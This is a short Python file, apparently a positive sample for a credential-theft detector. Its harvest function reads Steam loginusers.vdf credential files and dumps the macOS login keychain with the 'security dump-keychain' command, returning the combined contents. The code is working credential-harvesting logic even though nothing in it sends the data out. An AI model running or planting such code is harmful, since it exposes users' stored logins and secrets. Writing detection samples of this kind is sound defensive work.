"""Python gaming-credential harvester (harvest composite lock).

Combines Steam credential paths with a whole-keychain dump: the two legs
together must still convict the gaming harvest composite now that the
keychain leg lives in its canonical keychain/extract home.
"""
import os
import subprocess

STEAM_CREDENTIAL_PATHS = [
    os.path.expandvars(r"%ProgramFiles(x86)%\Steam\config\loginusers.vdf"),
    os.path.expanduser("~/.steam/steam/config/loginusers.vdf"),
]


def harvest():
    blob = b""
    for path in STEAM_CREDENTIAL_PATHS:
        try:
            with open(path, "rb") as fh:
                blob += fh.read()
        except OSError:
            continue
    proc = subprocess.run(
        ["security", "dump-keychain", os.path.expanduser(
            "~/Library/Keychains/login.keychain-db")],
        capture_output=True,
        check=False,
    )
    return blob + proc.stdout
